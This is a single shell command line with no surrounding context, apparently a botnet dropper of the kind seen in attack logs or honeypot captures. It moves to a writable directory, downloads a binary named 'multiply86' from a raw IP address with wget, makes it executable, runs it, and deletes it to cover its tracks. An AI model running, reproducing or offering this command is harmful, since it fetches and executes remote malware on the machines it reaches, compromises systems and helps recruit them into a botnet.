cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.23/multiply86; chmod +x multiply86; ./multiply86; rm -rf multiply86
